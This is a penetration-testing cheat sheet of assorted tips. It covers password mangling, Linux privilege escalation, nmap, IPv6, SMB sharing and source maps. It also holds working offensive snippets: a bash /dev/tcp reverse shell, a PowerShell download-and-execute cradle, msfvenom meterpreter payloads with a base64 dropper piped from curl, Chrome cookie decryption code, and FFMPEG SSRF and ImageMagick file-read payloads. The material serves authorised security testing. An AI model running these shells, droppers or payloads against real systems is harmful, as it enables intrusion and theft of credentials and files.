# ðŸ“¦ Technical hints rarely used or covering aspects seen a single one time

> ðŸ“¡ **Note**: Use the TOC provided by the GitHub MD file rendering named `Outline`.

ðŸ¡ [Back to home](README.md).

## Password identifies hashcat patterns

> ðŸ“¡ **Note**: The tool [maskcat](https://github.com/JakeWnuk/maskcat) can be used to achieve such objective.

```bash
# go install github.com/jakewnuk/maskcat@latest
$ echo 'HelpDesk2023$' | maskcat
?u?l?l?l?u?l?l?l?d?d?d?d?s:13:4:281
```

## Password derivation from a base

> ðŸ“¡ **Note**: The [RSMangler](https://github.com/digininja/RSMangler) and [psudohash](https://github.com/t3l3machus/psudohash) scripts can be used and are both installed on the toolbox.

> âš  **Warning**: Usage of advanced derivation options for [psudohash](https://github.com/t3l3machus/psudohash) cause the generation to take a while and consume huge disk spaces.

```bash
# Using RSMangler
$ echo "MyPasswordBase" | /tools/password-mangler/rsmangler.rb --file - --min 1 --max 20 --output /tmp/passlist.txt
# Using psudohash
$ current_year=$(date +"%Y")
$ python3 /tools/password-derivation/psudohash.py -q -w "MyPasswordBase" --append-numbering 1 --numbering-limit 10 --years "2020-$current_year" --output /tmp/passlist.txt
$ python3 /tools/password-derivation/psudohash.py -q -w "MyPasswordBase" --common-paddings-before --common-paddings-after --output /tmp/passlist.txt
$ head -5 /tmp/passlist.txt
...
```

## Generate a custom dictionary of payloads

> ðŸ“¡ **Note**: The tool [gorilla](https://github.com/d4rckh/gorilla), installed on the box, will be used.

* [Documentation](https://github.com/d4rckh/gorilla).

```bash
# Generate an empty file to receive all the generated payloads
$ touch /tmp/dico.txt
# Generate a dictionary with payloads following the patterns: [a-z]{5}
$ /tools/wordlist-generator/target/release/gorilla --from-pattern "{a-z}{a-z}{a-z}{a-z}{a-z}" --output-file /tmp/dico.txt
gorilla: (warning) missing mutation sets
gorilla: using file /tmp/dico.txt as output
gorilla: will generate 11881376 words from a pattern {a-z}{a-z}{a-z}{a-z}{a-z}
         sizes before mutations: 71288256 bytes / 67 MB / 0 GB / 0 TB
gorilla: finished in 12.8689854s. 11881376 words -> 11881376 words
```

## Possible ways to perform a LPE on Linux

ðŸ“º See [this video from IppSec](https://www.youtube.com/watch?v=LfbwlPxToBc&t=3339s).

### Way 1

ðŸ’» Search for services listening on localhost and running as root then try to explore them...

```shell
netstat -anlp | grep LIST
```

### Way 2

Check if there is SPICE ports used.

Spice is an open remote computing solution, providing client access to remote displays and devices

The main use case is to get remote access to virtual machines.

Port example: 5800/5900 for VNC

```shell
ps -eaf | grep [PORT] #and check for SPICE port in the command line
```

ðŸ’» Use tool like remove-viewer to access to the console (`apt install virt-viewer`)

```shell
remove-viewer spice://[TARGET_ADDRESS]:[SPICE_PORT]
```

ðŸ‘€ Once on the login prompt:

1) Reboot the VM via `CTRL+ALT+DEL`.
2) Edit the GRUB to have a shell as root: [password recovery](https://linuxhint.com/reset_password_kali_linux_2020/).
3) Change the root password and then reboot the VM.

## Get information to use for system PrivEsc

> **Note**: Use the following tools.

### Get infos

#### Linux

* [Linux Enumeration](https://github.com/rebootuser/LinEnum)
* [Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

#### Windows Powershell

* [Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

### Get applicable exploit

#### Linux

* [Linux Exploits Suggester](https://github.com/mzet-/linux-exploit-suggester)

#### Windows PowerShell

* [Windows Exploits Suggester](https://github.com/bitsadmin/wesng)

## Share files between a Linux and a Windows machine

:information_source: Here the attacker machine is the Linux (IP: 10.10.14.10) one and the victim is the Windows (IP: 10.10.10.158) one.

1. On the attacker machine (Linux), use the following command to create the SMB share:

```shell
$ sudo impacket-smbserver -username righettod -password righettod ShareSpace $(pwd)
Impacket v0.9.21 - Copyright 2019 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
```

2. On the victim machine (Windows), use the following command to mount the SMB share:

```powershell
PS> $pass = "righettod" | ConvertTo-SecureString -AsPlainText -Force
PS> $pass
System.Security.SecureString

PS> $cred = New-Object System.Management.Automation.PsCredential('righettod', $pass)
PS> $cred
UserName                                                               Password
--------                                                               --------
righettod                                          System.Security.SecureString

PS> New-PSDrive -name ShareSpace -root \\10.10.14.10\ShareSpace -Credential $cred -PSProvider "filesystem"
Name           Used (GB)     Free (GB) Provider      Root                      
----           ---------     --------- --------      ----                      
ShareSpace                             FileSystem    \\10.10.14.10\ShareSpace  

PS> cd ShareSpace:
```

:warning: I have meet the following error on Kali with *Impacket v0.9.20* and *Python 3.8.x*:

```shell
[*] Incoming connection (10.10.10.158,50124)
[*] AUTHENTICATE_MESSAGE (JSON\righettod,JSON)
[-] processRequest (0x73,Missing required parameter 'digestmod'.) <=== ERROR
[*] Handle: Missing required parameter 'digestmod'.
[*] Closing down connection (10.10.10.158,50124)
```

ðŸ“ To fix it, I have upgraded **impacket** via the following command:

```shell
sudo pip3 install impacket --upgrade
```

## Polyglots database of files

ðŸ‘€ The content from this [repository](https://github.com/Polydet/polyglot-database) can be used.

## Transfer a file between two Windows RDP sessions via the clipboard

> Can also be used in a context including one workstation and one RDP session.

* [Source](https://www.igorkromin.net/index.php/2017/04/26/base64-encode-or-decode-on-the-command-line-without-installing-extra-tools-on-linux-windows-or-macos/).

**Step 1:**

ðŸ’» On the *source* machine, create a script named **encode.bat** with the following set of commands:

```batch
@echo off
cls
echo Encoding %1 ...
del *.b64
certutil -encode %1 tmp.b64 && findstr /v /c:- tmp.b64 > data.b64
clip < data.b64
echo Encoded content sent to clipboard.
```

ðŸ‘€ Then call the script like this `encode.bat [MY_FILE]`.

**Step 2:**

On the *destination* machine, create a script named **decode.bat** with the following set of commands:

```batch
@echo off
powershell -command "Get-Clipboard" > data.txt
certutil -decode data.txt myfile.bin
```

ðŸ‘€ Then call the script like this `decode.bat` and rename the file **myfile.bin** created with the expected name and extension.

## Recover datetime from the Apache ETag response header

* [Format of the ETag](https://stackoverflow.com/a/7308209).
* [Documentation about ETag](https://www.keycdn.com/support/configure-entity-tags-etags).

ðŸ’» It allows to identify the last modification datetime of the associated resource. Use the following set of commands, assuming that the [ETag](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/ETag) header value returned is `ETag: "1cf-524daace96280-gzip"` (take the central value):

```bash
$ number=$((16#524daace96280))
$ epoch=$(($number/1000000))
$ date -d @$epoch
Thu Nov 19 02:28:26 CET 2015
$ echo $epoch
1447896506
```

ðŸ’» Use the following command to compute the ETag (central) value:

```bash
$ epoch=$(date --date="-5 hour" +%s)
$ adjusted=$(($epoch * 1000000))
$ value=$(printf "%x" $adjusted)
$ echo $value
5d06c00adf880
```

ðŸ’» To verify if a **ETag** value is known by a server, provide it in the [If-Match](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/If-Match) request header, like this `If-Match: "1cf-5d06c00adf880"` (without the `-gzip` suffix).

## Decompile Xamarin assemblies

ðŸ’» Sometimes a Xamarin .NET assembly can be compressed, you can detect it via the following way.

* If the command `file` return the following type:

```bash
$ file BouncyCastle.Crypto.dll
BouncyCastle.Crypto.dll: Sony PlayStation Audio
```

* If file start with the prefix **XALZ**:

```bash
$ xxd -b BouncyCastle.Crypto.dll | head -2
00000000: 01011000 01000001 01001100 01011010 00000011 00000000  XALZ..
00000006: 00000000 00000000 00000000 01011100 00101011 00000000  ...\+.
```

If it's the case then the tool [xamarin-decompress](https://github.com/NickstaDB/xamarin-decompress) can be used to decompress one of several assemblies:

```bash
$ python3 XamarinDecompress/xamarin-decompress.py BouncyCastle.Crypto.dll
Checking: BouncyCastle.Crypto.dll
b'XALZ\x03\x00\x00\x00'
[+] Found XALZ in header, decompressing...
[+] Decompressed assembly written to BouncyCastle.Crypto.decompressed.dll
$ ls *.dll
BouncyCastle.Crypto.decompressed.dll  BouncyCastle.Crypto.dll
$ file *.dll
BouncyCastle.Crypto.decompressed.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
BouncyCastle.Crypto.dll:              Sony PlayStation Audio
```

ðŸ’» From here, the following tools can be used to decompile the decompressed assemblies (ordered by personal preference):

1. [ILSpy](https://github.com/icsharpcode/ILSpy): Read only, cannot alter an assembly but can read compressed assembly directly.
2. [DNSpyEx](https://github.com/dnSpyEx/dnSpy): Can alter an assembly but cannot read compressed assembly directly.
3. [DotPeek](https://www.jetbrains.com/decompiler/): Read only, cannot alter an assembly and cannot read compressed assembly directly.

## Leverage MAP files to recover the SPA original code

* [Documentation](https://developer.mozilla.org/en-US/docs/Tools/Debugger/How_to/Use_a_source_map).
* [Introduction to MAP files](https://www.html5rocks.com/en/tutorials/developertools/sourcemaps/).

ðŸ’» For an SPA main JS bundle, check the presence of the following line at the end of the JS file:

```javascript
//# sourceMappingURL=main.xxx.chunk.js.map
```

ðŸ’» If it is present then check if the file is deployed alongside the `.js` file:

```shell
$ curl -k https://domain.com/static/js/main.xxx.chunk.js.map
...
```

ðŸ’» If it is deployed then use the following option from a browser (FF or Chrome) by right-clicking on the JS file name:

![AccessSPACodeViaMAPFiles](AccessSPACodeViaMAPFiles.png)

ðŸ’¡ The debugger panel open with the SPA code.

## Connect to listener for a reverse shell

### Linux

```shell
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.10.10/9001 0>&1'
```

### Windows Powershell

:information_source: For this case a web listener is needed in addition of the netcat listener.

:information_source: In the command below the web listener listen on `10.10.10.10:9200` and the netcat listener listen on `10.10.10.10:9001`

The PS command that is executed is based on [IEX (Invoke-Expression)](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-expression?view=powershell-7):

> The **Invoke-Expression** (IEX) cmdlet evaluates or runs **a specified string** as a command and returns the results of the expression or command.

*System.Net.WebClient* class [documentation](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadstring?view=netcore-3.1)

> Downloads the requested resource as a String. The resource to download may be specified as either String containing the URI or a Uri.

```powershell
PS> IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:9200/rs.ps1')
```

For the script executed (invoked as an string expression), the script [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) is used but with the **adding of this line at the end of the script to auto-execute the function** defined by the script:

```powershell
PS> Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 9001
```

## Setup a local listener for a reverse shell

> Netcat for Windows is provided in the [portable bundle of nmap](https://nmap.org/ncat/) as the file `ncat.exe`.

```shell
nc -lnvp 9001
```

## Identify OS version and architecture

### Linux

```shell
lsb_release -a
hostnamectl
cat /etc/os-release
```

ðŸ‘€ See the script [os-info.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/os-info.sh).

### Windows Powershell

```powershell
PS> Systeminfo 
Host Name:                 MACHINETEST
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
...
```

## Nmap vhosts scanning

* [NSE script documentation](https://nmap.org/nsedoc/scripts/http-vhosts.html).

```shell
nmap -iL hostnames.txt -Pn --open -p 80,443 -oN scan.txt --script http-vhosts --script-args http-vhosts.filelist=/tmp/vhost.txt
nmap -Pn --open -p 80 --script http-vhosts --script-args http-vhosts.filelist=/tmp/vhost.txt 172.31.1.69
```

## Nmap scan specifying a source port to bypass lazy firewall filtering

ðŸ’» Here using DNS ports because it is often allowed (no DNS resolution) and assuming that the host is alive

```shell
nmap -sS -p1-1024 -Pn -n -v --source-port 53 192.168.5.2
```

## Nmap on IPv6 target

IP is specified using `[IP]%[NETWORK_CARD_IDENTIFIER]`

```shell
nmap -6 -p 2222 --open fe80::5054:ff:fec6:7066%ens3
```

## Nmap UDP scan

> Via **unicornscan** in case of need `unicornscan -mU [TARGET]`.

* [Documentation](https://nmap.org/book/scan-methods-udp-scan.html).

```shell
nmap -sU [TARGET]
```

## SCP using IPv6

ðŸ’¡ IP is specified between `[]`.

*ens3* is the `[NETWORK_CARD_IDENTIFIER]`.

```shell
scp -P 987 user@[fe80::5054:ff:fec6:7066%ens3]:/home/file.txt .
```

## SSH using IPv6

*ens3* is the `[NETWORK_CARD_IDENTIFIER]`

```shell
ssh -p2222 user@fe80::5054:ff:fec6:7066%ens3
```

## Curl or wget or telnet or netcat using IPv6

* [Source](https://gist.github.com/chriselgee/c1c69756e527f649d0a95b6f20337c2f)

ðŸ’» Command examples:

*eth0* is the `[NETWORK_CARD_IDENTIFIER]`.

```shell
# IP is specified between []
$ curl http://[2001:7b8:666:ffff::1:42]:8080/ --interface eth0
...
# IP is specified between []
$ wget http://[2001:7b8:666:ffff::1:42]:8080/
...
$ telnet -6 2001:7b8:666:ffff::1:42
...
$ nc -6 2001:7b8:666:ffff::1:42%eth0 23
...
```

## Get IPv6 addresses of hosts around

ðŸ’» Ping the multicast IPV6 address (ff02::1) to get the IPV6 address of neighbours:

* [Source 1](https://en.wikipedia.org/wiki/Multicast_address#IPv6)

*ens3* is the `[NETWORK_CARD_IDENTIFIER]`

```shell
ping6 -I ens3 ff02::1
```

ðŸ‘€ See the script [identify-neighbour-hosts.sh](https://github.com/righettod/toolbox-pentest-web/blob/master/scripts/network-config.sh).

## List known hosts IPV6 addresses

```shell
ip -6 neigh
```

## File temporary storage location on linux

ðŸ¤” On Linux, file like reverse shell can be stored in the folder `/dev/shm` in order to not pollute the permanent storage and allow an auto-cleanup at reboot. `/dev/shm` is nothing but implementation of traditional shared memory concept.

## Listen for ICMP messages in order to test connection from a remote host

> **Note**: Useful to test a blind RCE.

ðŸ’» Run the following command on the attacker machine:

```shell
# Linux
# Example: tcpdump -i eth0 icmp
$ sudo tcpdump -i [INTERFACE] icmp
```

```powershell
# Windows: https://www.winpcap.org/windump/install/default.htm
# List the interface
PS> windump.exe -D
# Listen
# Example: windump.exe -i "\Device\NPF_{ABC26408-X6CZ-4200-9276-34V8982C9983}" icmp
PS> WinDump.exe -i "[INTERFACE]" icmp
```

ðŸ’» Run the following command on the victim machine:

```shell
# Linux
$ ping -c 2 [ATTACKER_IP]
```

```powershell
# Windows
PS> ping -n 2 [ATTACKER_IP]
```

## Verify if INPUT or OUTPUT traffic is filtered

### Linux

ðŸ’» Check the following files for presence of *IPTABLES* rules:

```shell
# For IPV4
$ cat /etc/iptables/rules.v4
# For IPV6
$ cat /etc/iptables/rules.v6
```

### Windows Powershell

```powershell
# Get firewall profiles that are enabled
PS> Get-NetFirewallProfile | Where { $_.Enabled -eq 'True' }
# List all inbound enabled rules
PS> Get-NetFirewallRule | Where { $_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound' }
# List all inbound enabled rules applying a block action
PS> Get-NetFirewallRule | Where { $_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound' -and $_.Action -eq 'Block' }
# List all outbound enabled rules
PS> Get-NetFirewallRule | Where { $_.Enabled -eq 'True' -and $_.Direction -eq 'Outbound' }
# List all outbound enabled rules applying a block action
PS> Get-NetFirewallRule | Where { $_.Enabled -eq 'True' -and $_.Direction -eq 'Outbound' -and $_.Action -eq 'Block' }
```

## Open RDP session via XFREERDP

* [Documentation](https://github.com/FreeRDP/FreeRDP/wiki/CommandLineInterface).

```shell
xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /v:[HOST] /u:[LOGIN] /p:[PASSWORD] /size:1180x708
```

## Start local SMTP server to allow to receive mail

ðŸ’» Run the following command:

```python
# Need python3
python -m smtpd -n -c DebuggingServer 0.0.0.0:25
```

**Note:** *DebuggingServer* indicate to discard the message after the *smtpd* server receives it.

## Meterpreter shell tips

* [MSFVenom cheatsheet documentation](https://book.hacktricks.xyz/shells/shells/msfvenom).
* [Meterpreter basics documentation](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/).

### Staged vs Stageless payloads

* [Staged vs Stageless handlers](https://buffered.io/posts/staged-vs-stageless-handlers/).

ðŸ“ **Stageless** offers the capability to avoid detection through the standard IPS/IDS because nothing other than encrypted communication is seen.

ðŸ“ **Staged** offers less forensic material on disk to be able to look at but can be discovered through IPS/IDS technologies.

### Generate a meterpreter client

#### Linux x86

```shell
msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp  LHOST=10.10.10.10 LPORT=2222 -f elf > shell.bin
file shell.bin
```

#### Windows x86

```shell
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=2222 -f exe > shell.exe
file shell.exe
```

### Start listener server

ðŸ’¡ Once in *MSFConsole*:

```shell
use exploit/multi/handler
set PAYLOAD [SAME_THAN_ONE_SPECIFIED_FOR_CLIENT] # Specified in parameter "-p"
set LHOST 10.10.10.10 # Network interface, like "eth0", can be specified instead of host/ip
set LPORT 2222
exploit
```

### Meterpreter client dropper

```bash
#!/bin/bash
# Meterpreter binary encoded in Base64
# via the command "cat meter.bin | base64 -w 0"
m="xxxx"
# Decode and execute it
echo $m | base64 -d > /tmp/meter.bin
chmod +x /tmp/meter.bin
/tmp/meter.bin
```

ðŸ‘€ Trigger execution via the command: `curl http://10.10.10.10/rs.sh | /bin/bash`

### Meterpreter useful commands

ðŸ‘€ See [here](Meterpreter_cheat_sheet.pdf) for more details or commands.

```shell
# Provides information about target host
meterpreter> sysinfo
# Obtain the username responsible for the current process
meterpreter> getuid
# Displays network interfaces information
meterpreter> ipconfig
# Obtain current working directory on Server side
meterpreter> getwd
# Obtain local current working directory
meterpreter> getlwd
# Read the given file
meterpreter> cat <file>
# Upload a file to the target host
meterpreter> upload <src file> <dst file>
# Download a file from the target host
meterpreter> download <src file> <dst file>
```

## SSH local port forwarding

* [Documentation](https://guide.offsecnewbie.com/port-forwarding-ssh-tunneling).

![Flow overview schema](SSH_Local_PortForwarding.jpg)

ðŸ’» Command syntax:

```bash
ssh -p [SSH_HOST_RELAY_PORT] -L [LOCAL_IP_BINDING]:[LOCAL_PORT_BINDING]:[TARGET_IP_TO_FORWARD_TRAFFIC_TO]:[TARGET_PORT_TO_FORWARD_TRAFFIC_TO] [USER]@[SSH_HOST_RELAY]
```

ðŸ’» Command example:

```bash
# Forward traffic on 127.0.0.1:9001 to 10.10.10.66:8080 via 10.10.10.82:4242 using key authentication on 10.10.10.82
$ ssh -i  ~/.ssh/toolbox-ssh-private-key.pem -p 4242 -L 127.0.0.1:9001:10.10.10.66:8080 righettod@10.10.10.82
# Forward traffic on 10.10.10.75:9001 to 10.10.10.66:8080 via 10.10.10.82:22 using key authentication on 10.10.10.82
$ ssh -i  ~/.ssh/toolbox-ssh-private-key.pem -L 10.10.10.75:9001:10.10.10.66:8080 righettod@10.10.10.82
# Forward traffic the 10.10.10.75:9001 to 10.10.10.66:8080 via 10.10.10.82:22 using password authentication on 10.10.10.82
$ ssh -L 10.10.10.75:9001:10.10.10.66:8080 righettod@10.10.10.82
```

## Set the web proxy at user scope on Windows

:speech_balloon: Can be used even if proxy settings are managed at organization level and cannot be changed via the GUI.

:speech_balloon: These proxy settings are applied for the current user.

ðŸ’» Change the following registry key:

```text
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings
```

ðŸ’» The directive `ProxyOverride` have the following format:

```text
"ProxyOverride"="*.luxtrust.com;*.ocsp.luxtrust.com;192.168.178.*"
```

ðŸ’» Set the proxy via the directive `ProxyServer` using the following format:

```text
"ProxyServer"="127.0.0.1:8080"
```

ðŸ’» Use the directive `ProxyEnable` to enable/disable the proxy in case of need:

* Enabled: `dword:00000001`
* Disabled: `dword:00000000`

## Analyze XOR ciphered data

* [Usage documentation](https://github.com/hellman/xortool#usage).

ðŸ’» The tool [xortool](https://github.com/hellman/xortool) was installed on the box to deal with such ciphering algorithm.

ðŸ’» Usage example: 

```shell
# Convert the Base64 encoded cipher text to hex and save it to a file
$ echo "Lz4sLCgwLTs=" | base64 -d | xxd -p > ciphertext-hex.txt
# Run analysis
$ xortool --hex --brute-printable ciphertext-hex.txt
The most probable key lengths:
1: 100.0%
```

## Decrypt Chrome cookies values on Windows

> ðŸ“¡ **Note**: Classes from this [project](https://github.com/mlkui/chrome-cookie-password-decryption) are used.

ðŸ’» Main class code snippet to use once the project is open into IntelliJ IDEA:

```java
package eu.righettod;
import main.java.com.mlkui.chrome.ChromeDecryptHelper;
import main.java.com.mlkui.chrome.cookie.entity.ChromeCookie;
import java.util.Set;

public class Entrypoint {
    public static void main(String[] args) {
        //Tested on Chrome Version "114.0.5735.199 (64 bit)"
        String base = System.getProperty("user.home");
        String profile = base + "\\AppData\\Local\\Google\\Chrome\\User Data";
        String cookieFileFullPathAndName = profile + "\\Default\\Network\\Cookies";
        String localStateFileFullPathAndName = profile + "\\Local State";
        ChromeDecryptHelper chromeDecryptHelper = new ChromeDecryptHelper(cookieFileFullPathAndName, localStateFileFullPathAndName);
        Set<ChromeCookie> chromeCookies = chromeDecryptHelper.getDecryptedCookies();
        for (ChromeCookie chromeCookie : chromeCookies) {
            System.out.println(chromeCookie);
        }
    }
}
```

## Verify NGINX configuration statically

ðŸ’¡ The tool [GIXY](https://github.com/yandex/gixy) can be used against the NGINX configuration file.

## Recover a remote GIT exposed repository

**Case 1:**

ðŸ’» If directory listing is **enabled** then just use the following command line:

```shell
wget --mirror -I .git https://mysite.com/.git/ 
```

**Case 2:**

ðŸ’» If directory listing is **not enabled** then use one the following tools, installed in the toolbox:

* **(more efficient)** [git-dumper](https://github.com/arthaud/git-dumper)
* [GitTools](https://github.com/internetwache/GitTools)

ðŸ’» Example with `git-dumper`:

```shell
$ git-dumper http://10.10.10.10/.git/ GitData
[-] Testing http://10.10.10.10/.git/HEAD [200]
[-] Testing http://10.10.10.10/.git/ [404]
[-] Fetching common files
...
```

ðŸ’» Example with `GitTools`:

```shell
$ bash /tools/GitTools/Dumper/gitdumper.sh http://10.10.10.10/.git/ GitData
[*] Destination folder does not exist
[+] Creating GitData/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
...
```

## Identify PHP composer packages deployed alongside a web application but not referenced

> ðŸ“¡ **Note**: The information from [Packagist](https://packagist.org) central packages repository will be used.

ðŸ’» Use the following set of commands:

```shell
# See https://packagist.org/apidoc#list-packages-all
wget -q -O list.json https://packagist.org/packages/list.json
cat list.json | jq -r '.packageNames[]' | sort -u > PKG-full.txt
cat list.json | jq -r '.packageNames[]' | cut -d'/' -f1 | sort -u > PKG.txt
ffuf -mc 403 -c -w PKG-full.txt -t 10 -u https://domain.com/bundles/FUZZ/
ffuf -mc 403 -c -w PKG.txt -t 10 -u https://domain.com/bundles/FUZZ/
```

## Obtain internal information from NTLM challenge

* [Documentation 1](https://www.xcitium.com/ntlm-explained/).
* [Documentation 2](https://blog.quest.com/ntlm-authentication-what-it-is-and-why-you-should-avoid-using-it/).

ðŸ’» When **NTLM authentication** is supported by a web app, it is possible to send the following NTLM authentcation data to receive an **NTLM challenge**:

```text
Authorization: NTLM TlRMTVNTUAABAAAAB4IIogAAAAAAAAAAAAAAAAAAAAAGAbEdAAAADw==
```

ðŸ‘€ The NTLM challenge will be located in the following response header:

```text
WWW-Authenticate: NTLM TlRMT...
```

ðŸ’¡ Then, the node module [ntlm-parser](https://www.npmjs.com/package/ntlm-parser) can used to parse the NTLM challenge to access to the internal information:

```bash
$ npm i -g ntlm-parser
$ ntlm-parser "TlRMT..."
object:  {
  messageType: 'CHALLENGE_MESSAGE (type 2)',
  targetNameSecBuf: { length: 4, allocated: 4, offset: 56 },
  flags: 'UNICODE NTLMSSP_REQUEST_TARGET NTLM ALWAYS_SIGN NTLMSSP_TARGET_TYPE_DOMAIN EXTENDED_SESSIONSECURITY TARGET_INFO VERSION 128 56',
  challenge: 'b5xxx',
...
```

## User enumeration techniques for Microsoft Exchange

* ðŸ“š Online documentations:
  * [Exchange penetration testing](https://github.com/kh4sh3i/exchange-penetration-testing).
  * [Attacking MS Exchange Web Interfaces](https://swarm.ptsecurity.com/attacking-ms-exchange-web-interfaces/).
  * [Timing-Based Username Enumeration](https://www.triaxiomsecurity.com/vulnerability-walkthrough-timing-based-username-enumeration/).
  * [Exchange notes](https://ppn.snovvcrash.rocks/pentest/perimeter/exchange).
* ðŸ”¨ Dedicated tools:
  * [msmailprobe](https://github.com/busterb/msmailprobe).
  * [Exchange Nmap scripts](https://github.com/righel/ms-exchange-version-nse).
  * [Microsoft Exchange Server Support Scripts](https://microsoft.github.io/CSS-Exchange/).
* ðŸ“‹ User enumeration techniques:
  * [Via ActiveSync](https://grimhacker.com/2017/07/24/office365-activesync-username-enumeration/).
  * [Via AutodiscoverV2](https://www.msxfaq.de/exchange/autodiscover/autodiscover_v2.htm).

ðŸ’¡ This [nuclei template](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/misconfiguration/ms-exchange-user-enum.yaml) can be used to test exposure.

ðŸ’» Example of usage of the **AutodiscoverV2** technique - send a random non-existing email and receive a valid user email address:

```text
>>>> REQUEST:
GET /autodiscover/autodiscover.json?Protocol=ActiveSync&Email=random-string%40domain.com&RedirectCount=1 HTTP/1.1
Host: mail.domain.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/119.0.6045.105
Connection: close

<<<< RESPONSE:
HTTP/1.1 302 Found
Cache-Control: private
Content-Type: text/html; charset=utf-8
Location: https://outlook.office365.com/autodiscover/autodiscover.json?Email=firstname.lastname%40domain.com&Protocol=ActiveSync&RedirectCount=1
Connection: close
```

```bash
$ http "https://mail.domain.com/autodiscover/autodiscover.json?Protocol=ActiveSync&Email=abcdef%40domain.com&RedirectCount=1" | grep -Po "Email=([a-zA-Z0-9.%]+)"
dominique.righetto@domain.com
```

## Retrieve the password used to protected a MS Access database file

> ðŸ“¡ **Note**: Work only for **Microsoft Access 95/97/2000/XP** or with **Jet Database Engine 3.0/4.0** format.

ðŸ’» The software [Access PassView](https://www.nirsoft.net/utils/accesspv.html) can be used to access to the password used to protect the target database file.

ðŸ’¡ The **login** can be retrieved via the file, named `[DB_FILE].ldb`, created when the `mdb` file is opened:

ðŸ’» Example of content of an `ldb` file:

```text
WIN-5RBJ1PD6P8F
Admin                           
```

ðŸ’» The software [DBVisualizer](https://www.dbvis.com/database/msaccess/) can be used to access to the content of the MS Access database file, once, the login and password are retrieved.

<!-- 
Keep the section "Miscellaneous tips" as the last one of the cheat sheet 
-->

## Miscellaneous tips

> âš  **Warning**: This section gather and centralize differents tips that cannot fit in a specific single section.

### SSRF via FFMPEG

> ðŸ“¡ **Note**: The context is an application using [FFMPEG](https://ffmpeg.org/) to encode videos provided by users.

* [BlackHat 2016 talk slides](https://www.blackhat.com/docs/us-16/materials/us-16-Ermishkin-Viral-Video-Exploiting-Ssrf-In-Video-Converters.pdf).

ðŸ’» Code snippet showing usage (filename is `test.m3u8`) - A video will be created concatenating the content of the file `index.html` + the content of the file `/etc/passwd`:

```text
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:https://mylistener.com/index.html|file:///etc/passwd
#EXT-X-ENDLIST
```

### Read or write local file via ImageMagick

> ðŸ“¡ **Note**: The context is an application using `ImageMagick: https://imagemagick.org` to manipulate images provided by users.

* [Vulnerability analysis](https://zxsecurity.co.nz/research/advisories/ruby-dragonfly-cve-2021-33564/).
* Associated [CVE-2021-33564](https://nvd.nist.gov/vuln/detail/CVE-2021-33564).

ðŸ’» Code snippet showing usage for LFI:

```shell
# Payload:
# [["g","convert","-size 1x1 -depth 8 gray:/etc/passwd","out"]]
#
# Base64 encoded payload provided to the vulnerable endpoint:
# W1siZyIsImNvbnZlcnQiLCItc2l6ZSAxeDEgLWRlcHRoIDggZ3JheTovZXRjL3Bhc3N3ZCIsIm91dCJdXQ==
#
# Call example:
$ curl "http://host.com/system/refinery/images/[Base64_Encoded_Payload]"
[FILE CONTENT]
```

### Provide an HTTP parameter as an array or a dictionary

ðŸ’» Syntax to send an HTTP parameter as a **array**:

```text
myParamName[0]=value1&myParamName[1]=value2
```

ðŸ’» Syntax to send an HTTP parameter as a **dictionary**:

```text
myParamName[key]=value
```
